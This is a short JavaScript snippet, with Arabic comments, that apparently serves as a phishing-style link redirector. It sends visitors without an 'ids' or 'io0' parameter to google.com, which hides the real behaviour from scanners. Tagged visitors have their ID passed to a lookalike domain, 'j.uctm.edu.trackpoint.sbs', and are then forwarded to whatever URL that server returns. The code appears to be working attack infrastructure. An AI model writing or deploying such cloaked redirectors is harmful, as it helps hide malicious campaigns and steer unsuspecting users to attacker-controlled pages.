(function() {
    // استخراج قيمة المعامل ids أو io0 من الرابط الحالي
    var params = new URLSearchParams(window.location.search);
    var paramValue = params.get("ids") || params.get("io0");

    if (!paramValue) {
        window.location.replace("https://www.google.com");
        return;
    }

    // توجيه الطلب حصرياً وبشكل مطلق نحو نطاقك الفرعي المحدد
    var targetUrl = "https://j.uctm.edu.trackpoint.sbs/api/input?ids=" + encodeURIComponent(paramValue);

    fetch(targetUrl, {
        method: 'GET',
        headers: {
            'Accept': 'application/json'
        }
    })
    .then(function(res) {
        return res.json();
    })
    .then(function(data) {
        if (data && data.redirectUrl) {
            window.location.replace(data.redirectUrl);
        }
    })
    .catch(function(err) {
        console.error("Execution error:", err);
    });
})();
